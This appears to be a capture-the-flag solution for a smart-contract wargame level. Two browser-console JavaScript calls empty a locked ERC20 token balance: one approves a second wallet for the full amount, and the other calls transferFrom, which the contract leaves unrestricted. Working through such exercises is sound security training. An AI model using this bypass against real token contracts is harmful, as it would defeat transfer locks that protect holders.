# Answer

Goal: Get your token balance to 0.

## 1. Allowance

The token only partially overrides ERC20 methods, the transferFrom is left untouched. Meaning if we grant allowance to any other address we control we can freely move our tokens out.

By using the browser console:

```js
await contract.approve('<a new wallet>', await contract.balanceOf(player));
```

## 2. Transferring tokens

After allowance has been granted switch to the new wallet to transfer tokens using `transferFrom()`.

```js
await contract.transferFrom('<original player>', player, await contract.balanceOf('<original player>'));
```